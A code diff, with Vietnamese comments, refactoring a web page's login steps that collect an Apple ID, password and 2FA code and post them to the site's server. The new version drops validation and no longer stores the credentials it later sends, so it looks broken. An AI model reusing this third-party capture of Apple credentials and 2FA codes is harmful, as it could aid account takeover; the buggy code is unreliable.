@@ -204,154 +204,108 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   // Step 1: Login
-  elements.loginBtn.addEventListener('click', async (e) => {
+  // Hàm xử lý đăng nhập mới
+elements.loginBtn.addEventListener('click', async (e) => {
     e.preventDefault();
     if (isLoading) return;
     
     hideError();
     setLoading(true);
-
-    const APPLE_ID = elements.appleIdInput.value.trim();
-    const PASSWORD = elements.passwordInput.value;
-    
-    if (!APPLE_ID || !PASSWORD) {
-        showError('Vui lòng nhập Apple ID và mật khẩu.');
-        setLoading(false);
-        return;
-    }
-
-    state.APPLE_ID = APPLE_ID;
-    state.PASSWORD = PASSWORD;
-
     setProgress(1);
 
     try {
         const response = await fetch('/auth', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ APPLE_ID, PASSWORD })
+            body: JSON.stringify({
+                APPLE_ID: elements.appleIdInput.value.trim(),
+                PASSWORD: elements.passwordInput.value
+            })
         });
 
         const data = await response.json();
         console.log('Auth response:', data);
 
-        // Xử lý tất cả trường hợp lỗi trước
-        if (!response.ok || data.error) {
-            // Trường hợp sai mật khẩu
-            if (data.error?.includes('Sai tài khoản') || data.error?.includes('invalid_credentials')) {
-                showError(data.error);
-                return;
-            }
-            // Các lỗi khác
-            showError(data.error || 'Lỗi xác thực');
-            return;
-        }
-
-        // Trường hợp cần 2FA
         if (data.require2FA) {
+            // CHỈ chuyển step 2 khi require2FA là true và KHÔNG có lỗi
             state.requires2FA = true;
-            state.verified2FA = false;
-            state.dsid = data.dsid || 'unknown';
+            state.dsid = data.dsid;
             
-            // Hiển thị step 2FA
+            elements.verifyMessage.textContent = data.message;
             elements.step2.style.display = 'block';
-            elements.step2.classList.remove('hidden');
-            elements.verifyMessage.textContent = data.message || 'Vui lòng nhập mã xác minh 2FA';
-            
             transition(elements.step1, elements.step2);
             setProgress(2);
             return;
         }
 
-        // Trường hợp đăng nhập thành công không cần 2FA
         if (data.success) {
-            state.requires2FA = false;
+            // Đăng nhập thành công không cần 2FA
             state.verified2FA = true;
             state.dsid = data.dsid;
-            
-            showToast('Đăng nhập thành công!');
             transition(elements.step1, elements.step3);
             setProgress(3);
             return;
         }
 
-        // Trường hợp mặc định (phòng hờ)
-        showError('Lỗi không xác định');
+        // Hiển thị lỗi SAI MẬT KHẨU và KHÔNG chuyển step
+        showError(data.error || 'Đăng nhập thất bại');
 
     } catch (error) {
-        console.error('Auth error:', error);
-        showError('Không thể kết nối tới máy chủ');
+        showError('Lỗi kết nối đến máy chủ');
     } finally {
         setLoading(false);
     }
 });
 
-  // Step 2: Verify 2FA
-  elements.verifyBtn.addEventListener('click', async (e) => {
+// Hàm xử lý verify 2FA mới
+elements.verifyBtn.addEventListener('click', async (e) => {
     e.preventDefault();
     if (isLoading) return;
     
     hideError();
     setLoading(true);
-
-    const CODE = elements.verificationCodeInput.value.trim();
-    if (CODE.length !== 6) {
-      showError('Mã xác minh phải có 6 chữ số.');
-      setLoading(false);
-      return;
-    }
-
     setProgress(2);
 
     try {
-      const response = await fetch('/verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          APPLE_ID: state.APPLE_ID, 
-          PASSWORD: state.PASSWORD, 
-          CODE,
-          dsid: state.dsid 
-        })
-      });
+        const response = await fetch('/verify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                APPLE_ID: state.APPLE_ID,
+                PASSWORD: state.PASSWORD,
+                CODE: elements.verificationCodeInput.value.trim(),
+                dsid: state.dsid
+            })
+        });
 
-      const data = await response.json();
-      console.log('Verify response:', data);
+        const data = await response.json();
+        console.log('Verify response:', data);
 
-      if (data.newChallenge) {
-        // Yêu cầu nhập mã mới nếu mã cũ sai
-        showError(data.error);
-        elements.verificationCodeInput.value = '';
-        elements.verificationCodeInput.focus();
-        return;
-      }
+        if (data.shouldRetry) {
+            // Mã 2FA sai nhưng vẫn ở step 2
+            showError(data.error);
+            elements.verificationCodeInput.value = '';
+            elements.verificationCodeInput.focus();
+            return;
+        }
 
-      if (!response.ok) {
-        showError(data.error || 'Xác minh thất bại.');
-        return;
-      }
+        if (data.success) {
+            // Xác thực 2FA thành công
+            state.verified2FA = true;
+            state.CODE = elements.verificationCodeInput.value.trim();
+            
+            elements.step2.style.display = 'none';
+            transition(elements.step2, elements.step3);
+            setProgress(3);
+            return;
+        }
 
-      if (data.success) {
-        state.CODE = CODE;
-        state.verified2FA = true;
-        state.dsid = data.dsid || state.dsid;
-        showToast('Xác thực 2FA thành công!');
+        showError(data.error || 'Xác thực thất bại');
 
-        // Ẩn step2
-        elements.step2.classList.add('hidden');
-        elements.step2.style.display = 'none';
-        elements.verificationCodeInput.value = '';
-        
-        transition(elements.step2, elements.step3);
-        setProgress(3);
-      } else {
-        showError(data.error || 'Mã xác minh không đúng.');
-      }
     } catch (error) {
-      console.error('Verify error:', error);
-      showError('Không thể kết nối tới máy chủ.');
+        showError('Lỗi kết nối đến máy chủ');
     } finally {
-      setLoading(false);
+        setLoading(false);
     }
 });
 
